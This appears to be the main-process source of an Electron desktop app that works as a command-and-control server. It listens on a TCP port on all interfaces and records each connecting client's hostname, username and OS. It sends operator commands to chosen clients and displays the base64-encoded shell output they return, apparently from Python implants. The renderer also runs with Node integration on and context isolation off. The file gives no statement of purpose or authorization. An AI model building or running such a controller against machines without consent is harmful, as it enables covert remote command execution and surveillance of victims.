const { app, BrowserWindow, ipcMain } = require('electron');
const net = require('net');
const path = require('path');

let mainWindow;
let server;
let clients = new Map();

class SimpleClient {
    constructor(socket) {
        this.socket = socket;
        this.id = `${socket.remoteAddress}:${socket.remotePort}`;
        this.info = {};
        this.buffer = '';
        this.connected_at = new Date().toISOString();
        
        console.log(`New client connection: ${this.id}`);
    }

    sendMessage(message) {
        try {
            const messageStr = JSON.stringify(message) + '\n';
            this.socket.write(messageStr);
            return true;
        } catch (error) {
            console.error('Send message error:', error);
            return false;
        }
    }
}

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 1400,
        height: 900,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        },
        show: false
    });

    mainWindow.loadFile('index.html');
    
    mainWindow.once('ready-to-show', () => {
        mainWindow.show();
    });
    
    // Development mode
    if (process.env.NODE_ENV === 'development') {
        mainWindow.webContents.openDevTools();
    }
}

app.whenReady().then(() => {
    createWindow();
    
    app.on('activate', () => {
        if (BrowserWindow.getAllWindows().length === 0) createWindow();
    });
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        clients.forEach(client => {
            try {
                client.socket.destroy();
            } catch (e) {}
        });
        
        if (server) {
            server.close();
        }
        
        app.quit();
    }
});

// Server management
ipcMain.on('start-server', (event, { port }) => {
    if (server && server.listening) {
        mainWindow.webContents.send('server-error', 'Server is already running');
        return;
    }

    try {
        server = net.createServer((socket) => {
            const client = new SimpleClient(socket);
            
            // Set socket options
            socket.setKeepAlive(true, 30000);
            socket.setTimeout(300000); // 5 minute timeout
            
            // Handle client data
            socket.on('data', (data) => handleClientData(client, data));
            socket.on('close', () => handleClientDisconnect(client));
            socket.on('error', (error) => handleClientError(client, error));
            socket.on('timeout', () => {
                console.log('Client timeout:', client.id);
                socket.destroy();
            });
        });

        server.listen(port, '0.0.0.0', () => {
            console.log(`Server started on port ${port}`);
            mainWindow.webContents.send('server-started', { 
                port, 
                message: `Server listening on all interfaces, port ${port}` 
            });
        });

        server.on('error', (err) => {
            console.error('Server error:', err);
            let errorMessage = 'Unknown server error';
            
            if (err.code === 'EADDRINUSE') {
                errorMessage = `Port ${port} is already in use`;
            } else if (err.code === 'EACCES') {
                errorMessage = `Permission denied for port ${port}`;
            } else {
                errorMessage = err.message;
            }
            
            mainWindow.webContents.send('server-error', errorMessage);
        });

        server.on('close', () => {
            console.log('Server closed');
            mainWindow.webContents.send('server-stopped');
        });

    } catch (error) {
        console.error('Failed to start server:', error);
        mainWindow.webContents.send('server-error', error.message);
    }
});

ipcMain.on('stop-server', () => {
    if (server) {
        clients.forEach(client => {
            try {
                client.sendMessage({ type: 'disconnect', message: 'Server shutting down' });
                setTimeout(() => client.socket.destroy(), 1000);
            } catch (e) {
                client.socket.destroy();
            }
        });
        
        clients.clear();
        server.close();
        server = null;
    }
});

ipcMain.on('send-command', (event, { clientId, command }) => {
    const client = clients.get(clientId);
    if (client) {
        try {
            client.sendMessage({ 
                type: 'command',
                data: command,
                timestamp: Date.now()
            });
            
            mainWindow.webContents.send('command-sent', { 
                clientId, 
                command, 
                timestamp: Date.now() 
            });
            
        } catch (error) {
            console.error('Failed to send command:', error);
            mainWindow.webContents.send('client-error', { 
                clientId, 
                error: 'Failed to send command' 
            });
        }
    }
});

ipcMain.on('disconnect-client', (event, clientId) => {
    const client = clients.get(clientId);
    if (client) {
        try {
            client.sendMessage({ type: 'disconnect', message: 'Disconnected by server' });
            setTimeout(() => client.socket.destroy(), 500);
        } catch (e) {
            client.socket.destroy();
        }
    }
});

// Message handling functions
function handleClientData(client, data) {
    try {
        client.buffer += data.toString();
        
        // Process complete messages (lines)
        while (client.buffer.includes('\n')) {
            const newlineIndex = client.buffer.indexOf('\n');
            const messageData = client.buffer.slice(0, newlineIndex);
            client.buffer = client.buffer.slice(newlineIndex + 1);
            
            if (messageData.trim()) {
                try {
                    const message = JSON.parse(messageData);
                    handleClientMessage(client, message);
                } catch (parseError) {
                    console.error('Message parsing error:', parseError);
                    console.error('Raw message:', messageData);
                }
            }
        }
    } catch (error) {
        console.error('Client data handling error:', error);
    }
}

function handleClientMessage(client, message) {
    try {
        switch (message.type) {
            case 'client_info':
                // Store client info and add to clients map
                client.info = {
                    hostname: message.hostname || 'Unknown',
                    username: message.username || 'Unknown',
                    os: message.os || 'Unknown',
                    os_version: message.os_version || '',
                    architecture: message.architecture || 'Unknown',
                    python_version: message.python_version || 'Unknown',
                    cpu_count: message.cpu_count || 1,
                    platform_details: message.platform_details || 'Unknown',
                    connected_at: client.connected_at
                };
                
                // Add to clients map AFTER we have the info
                clients.set(client.id, client);
                
                console.log(`Client info received for ${client.id}:`, client.info);
                
                // Send to renderer
                mainWindow.webContents.send('client-connected', {
                    id: client.id,
                    ...client.info
                });
                break;
                
            case 'shell_output':
                if (message.data) {
                    const output = Buffer.from(message.data, 'base64').toString();
                    
                    mainWindow.webContents.send('shell-output', {
                        clientId: client.id,
                        output: output,
                        timestamp: Date.now()
                    });
                }
                break;
                
            case 'pong':
                console.log(`Pong received from ${client.id}`);
                break;
                
            case 'error':
                mainWindow.webContents.send('client-error', {
                    clientId: client.id,
                    error: message.message || 'Unknown error'
                });
                break;
                
            default:
                console.log('Unknown message type:', message.type, 'from', client.id);
        }
    } catch (error) {
        console.error('Message handling error:', error);
    }
}

function handleClientDisconnect(client) {
    console.log(`Client disconnected: ${client.id}`);
    
    // Remove from clients map
    clients.delete(client.id);
    
    // Notify renderer
    mainWindow.webContents.send('client-disconnected', {
        id: client.id,
        hostname: client.info.hostname || client.id
    });
}

function handleClientError(client, error) {
    console.error(`Client error (${client.id}):`, error.message);
    
    // Don't spam with connection errors
    if (!['ECONNRESET', 'EPIPE', 'ETIMEDOUT'].includes(error.code)) {
        mainWindow.webContents.send('client-error', {
            clientId: client.id,
            error: error.message
        });
    }
    
    // Clean up on error
    setTimeout(() => {
        if (clients.has(client.id)) {
            handleClientDisconnect(client);
        }
    }, 1000);
}

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('Shutting down gracefully...');
    
    if (server) {
        clients.forEach(client => {
            try {
                client.socket.destroy();
            } catch (e) {}
        });
        server.close();
    }
    
    app.quit();
});

process.on('SIGTERM', () => {
    console.log('Terminated');
    app.quit();
});